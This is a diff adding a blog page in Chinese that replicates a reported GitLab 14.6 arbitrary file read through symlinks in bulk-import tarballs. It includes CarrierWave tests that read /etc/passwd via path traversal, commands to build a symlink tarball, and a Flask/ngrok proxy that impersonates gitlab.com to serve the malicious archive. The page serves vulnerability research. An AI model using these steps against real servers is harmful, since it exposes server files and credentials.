@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Replication: Gitlab Arbitrary file read via the bulk imports UploadsPipeline | sunriseXu’s bug hunting journey</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Replication: Gitlab Arbitrary file read via the bulk imports UploadsPipeline" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Name" />
+<meta property="og:description" content="Name" />
+<link rel="canonical" href="http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports.html" />
+<meta property="og:url" content="http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports.html" />
+<meta property="og:site_name" content="sunriseXu’s bug hunting journey" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-01-15T10:31:06+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Replication: Gitlab Arbitrary file read via the bulk imports UploadsPipeline" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-01-15T10:31:06+08:00","datePublished":"2024-01-15T10:31:06+08:00","description":"Name","headline":"Replication: Gitlab Arbitrary file read via the bulk imports UploadsPipeline","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports.html"},"url":"http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="sunriseXu&apos;s bug hunting journey" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">sunriseXu&#39;s bug hunting journey</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Replication: Gitlab Arbitrary file read via the bulk imports UploadsPipeline</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2024-01-15T10:31:06+08:00" itemprop="datePublished">Jan 15, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Gitlab Arbitrary file read via the bulk imports UploadsPipeline</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>path-traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>高危</p>
+</blockquote>
+
+<h2 id="environment">Environment</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GitLab information
+
+Version: 14.6.0-ee
+Directory: /opt/gitlab/embedded/service/gitlab-rails
+</code></pre></div></div>
+
+<blockquote>
+  <p>原文：<a href="https://hackerone.com/reports/1439593">https://hackerone.com/reports/1439593</a></p>
+</blockquote>
+
+<p><strong>Gitlab Docker</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run --detach \
+  --hostname 10.206.44.20 \
+  --publish 4435:443 --publish 8035:80 --publish 2235:22 \
+  --name gitlab14.6 \
+  --restart always \
+  --shm-size 256m \
+  gitlab/gitlab-ee:14.6.0-ee.0
+</code></pre></div></div>
+
+<h2 id="summary">Summary</h2>
+
+<p>Group导入，从其他gitlab instance导入，被导入的group milestone中的附件会形成压缩文件，并且下载到后端。而后端在解压时，没有对压缩包的symlink进行去除，导致该链接文件指向的任意文件被读取和导入。造成任意文件读取漏洞。</p>
+
+<h3 id="methods-flow">Methods flow</h3>
+
+<p>触发该行为的controller：
+<em>app/controllers/import/bulk_imports_controller.rb:43</em></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def create
+    responses = create_params.map { |entry| ::BulkImports::CreateService.new(current_user, entry, credentials).execute }
+
+    render json: responses.map { |response| { success: response.success?, id: response.payload[:id], message: response.message } }
+end
+</code></pre></div></div>
+
+<p>文件解压采用popen执行命令方式：
+<em>lib/gitlab/import_export/command_line_util.rb</em></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def untar_with_options(archive:, dir:, options:)
+    execute_cmd(%W(tar -#{options} #{archive} -C #{dir}))
+    execute_cmd(%W(chmod -R #{UNTAR_MASK} #{dir}))
+end
+</code></pre></div></div>
+
+<p>解压后对文件进行移动或者上传:
+<em>app/services/upload_service.rb</em></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def execute
+    return unless file &amp;&amp; file.size &lt;= max_attachment_size
+
+    uploader = uploader_class.new(model, nil, **uploader_context)
+    uploader.store!(file)
+
+    uploader
+end
+</code></pre></div></div>
+<p>其中store!函数是carrierwave库的内置函数，用于移动文件。</p>
+
+<h3 id="analysis">Analysis</h3>
+
+<p>对carrierwave库进行demo测试，发现carrierwave的store!方法能够直接读取symlink指向的文件内容并且进行存储,对carrierwave进行文件操作测试：</p>
+
+<ol>
+  <li>测试路径穿越</li>
+  <li>测试symlink读取和写入</li>
+</ol>
+
+<p>参考：<a href="https://www.youtube.com/watch?v=4VkKmQWJoBI">Uploading files in Rails 5</a></p>
+
+<ol>
+  <li>create app: <code class="language-plaintext highlighter-rouge">rails new Carrierwave</code></li>
+  <li>add carrierwave to gemfile: <code class="language-plaintext highlighter-rouge">gem 'carrierwave', '~&gt; 3.0'</code></li>
+  <li><code class="language-plaintext highlighter-rouge">bundle install</code></li>
+  <li>create uploader:  <code class="language-plaintext highlighter-rouge">rails generate uploader File</code></li>
+  <li>create scaffold: <code class="language-plaintext highlighter-rouge">rails generate scaffold Test image:string</code></li>
+  <li>add <code class="language-plaintext highlighter-rouge">mount_uploader :image, FileUploader</code> to test.rb model</li>
+  <li>migrate db: <code class="language-plaintext highlighter-rouge">bin/rails db:migrate</code></li>
+  <li>change add image view: app/view/test/_form
+ a. <code class="language-plaintext highlighter-rouge">&lt;%= form.file_field :image %&gt;</code></li>
+  <li>start server: <code class="language-plaintext highlighter-rouge">bin/rails s -b 0.0.0.0</code></li>
+  <li>open: localhost:3000/tests to upload image</li>
+  <li><code class="language-plaintext highlighter-rouge">bin/rails console</code> to debug:(prepare file: <code class="language-plaintext highlighter-rouge">ln -s /etc/passwd /home/kali/test</code>)
+    <ul>
+      <li>initialize
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  u = Test.new
+  u.id = 1
+  b = File.open("/home/kali/test")
+  u.image.store!(b)
+  check file content: /home/kali/rubyprojects/Carrierwave/public/uploads/test/image/1/test
+</code></pre></div>        </div>
+      </li>
+      <li>Uploader:: retrieve_from_store!方法：存在目录穿越问题
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  u.image.retrieve_from_store!('../../../../../../../../../../../etc/passwd')
+  u.image.file
+  #&lt;CarrierWave::SanitizedFile:0x00007f7daa7cfe50
+      @content=nil,
+      @content_type=nil,
+      @declared_content_type=nil,
+      @file="/etc/passwd",
+      @original_filename=nil&gt;
+</code></pre></div>        </div>
+      </li>
+      <li>Uploader:: retrieve_from_store!方法配合copy_to方法：通过目录穿越读取任意文件
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  u.image.retrieve_from_store!('../../../../../../../../../../../etc/passwd')
+  u.image.file
+  #&lt;CarrierWave::SanitizedFile:0x00007f7da8c38ea8
+      @content=nil,
+      @content_type=nil,
+      @declared_content_type=nil,
+      @file="/etc/passwd",
+      @original_filename=nil&gt;
+  b = File.open('/home/kali/test')
+  u.image.file.copy_to(b)
+  那么u.image.file指向的/etc/passwd会拷贝到文件/home/kali/test
+</code></pre></div>        </div>
+      </li>
+      <li>CarrierWave::SanitizedFile copy_to方法：存在读取链接文件问题
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  u.image.retrieve_from_store!('../../../../../../../../../../../home/kali/link') # link指向/etc/passwd
+  u.image.file
+  #&lt;CarrierWave::SanitizedFile:0x00007f7da89fc0b8
+      @content=nil,
+      @content_type=nil,
+      @declared_content_type=nil,
+      @file="/home/kali/link",
+      @original_filename=nil&gt;
+  u.image.file.copy_to(File.open('/home/kali/blank')) # 此时，blank文件被拷贝了passwd内容
+</code></pre></div>        </div>
+      </li>
+      <li>CarrierWave::SanitizedFile store!方法：存在读取链接文件问题
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  u.image.store!(File.open("/home/kali/link")) # link指向/etc/passwd，此时，passwd内容被存储进model的内部空间
+</code></pre></div>        </div>
+      </li>
+      <li>CarrierWave::SanitizedFile store!方法：测试写入链接文件能力，无该问题
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  u.image.retrieve_from_store!('../../../../../../../../../../../home/kali/test2') # test2指向test
+  u.image.store!(File.open("/home/kali/test3")) # 写入内容失败，原因是store!只会写入model指向的空间
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+</ol>
+
+<h2 id="tips">Tips</h2>
+
+<ol>
+  <li>get all routes of rails app:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> gitlab-rails routes &gt; routes.txt
+</code></pre></div>    </div>
+  </li>
+  <li>create symlink and compress to tar.gz, extract tar.gz file to folder:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ln -s /etc/passwd passwd
+    
+ tar –czf test.tar.gz passwd
+    
+ tar –xzf test.tar.gz -c /tmp/data
+</code></pre></div>    </div>
+  </li>
+  <li>import burpsuite cert:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> apt-get install -y ca-certificates
+ convert burp.der to burp.crt format
+ sudo openssl x509 -inform der -outform pem -in burp.der -out burp.crt
+ copy burp.crt to ca loaction:
+ sudo cp burp.crt /usr/local/share/ca-certificates/
+ # 参考：https://docs.gitlab.com/omnibus/settings/ssl/index.html#using-a-custom-certificate-chain，gitlab自身配置了新地方
+ sudo cp burp.crt /etc/gitlab/trusted-certs/
+ sudo update-ca-certificates
+ gitlab-ctl reconfigure 
+</code></pre></div>    </div>
+  </li>
+  <li>路径穿越，并且进行拷贝
+    <ul>
+      <li>fileK = retrieve_from_store!的参数为路径字符串，传入 ../ 能够索引到任意文件，类似于File.open()</li>
+      <li>copy_to的参数为file句柄，指向某文件路径。fileK调用该函数能够将上一步的任意文件拷贝到指定路径</li>
+    </ul>
+  </li>
+  <li>路径穿越读取链接文件，拷贝链接文件指向内容
+    <ul>
+      <li>fileK = retrieve_from_store!的参数为路径字符串，传入 ../ 能够索引到任意文件，类似于File.open()，也可以索引到链接文件</li>
+      <li>copy_to的参数为file句柄，指向某文件路径。fileK调用该函数能够将上一步的链接文件指向内容拷贝到指定路径</li>
+    </ul>
+  </li>
+  <li>直接读取链接文件指向内容
+    <ul>
+      <li>store!的参数是File句柄，当该句柄指向链接文件，那么可以读取链接文件内容。配合解压后的文件包含的链接文件。</li>
+    </ul>
+  </li>
+  <li>文件解压操作，命令行方式以及第三方库方式</li>
+  <li>
+    <p>ngrok伪造服务器，进行流量分发：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> from flask import Flask, request, Response, send_file
+ import requests
+
+ app = Flask(__name__)
+ HTTP_METHODS = ['GET', 'HEAD', 'POST', 'PUT',
+                 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH']
+
+ def do_proxy(request, path):
+     excluded_headers = ['content-encoding',
+                         'content-length', 'transfer-encoding', 'connection', 'host']
+
+     headers = [(name, value) for (name, value) in request.headers
+             if name.lower() not in excluded_headers]
+
+     host = request.headers["host"]
+     if host.endswith("ngrok.io"):
+         host = "gitlab.com"
+            
+     resp = requests.request(
+         url=f'https://{host}/{path}?{request.query_string.decode()}', method=request.method, headers=dict(headers), data=request.data)
+        
+     headers = [(name, value) for (name, value) in resp.raw.headers.items()
+             if name.lower() not in excluded_headers]
+     response = Response(resp.content, resp.status_code, headers)
+     return response
+
+ @app.route('/', defaults={'path': ''}, methods=HTTP_METHODS)
+ @app.route('/&lt;path:path&gt;', methods=HTTP_METHODS)
+ def proxy(path):
+     # 对流量进行过滤，对于含有漏洞的请求，发送payload
+     if request.method == "GET" and request.query_string == b"relation=uploads":
+         return send_file("uploads.tar.gz", as_attachment=True, mimetype="application/octet-stream")
+     else:
+         # 其他正常请求，发送到gitlab服务器处理
+         return do_proxy(request, path)
+
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+  </div><a class="u-url" href="/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">sunriseXu&#39;s bug hunting journey</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">sunriseXu&#39;s bug hunting journey</li><li><a class="u-email" href="mailto:github@example.com">github@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>sunriseXu&#39;s bug hunting journey, sharing new findings of bug hunting.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
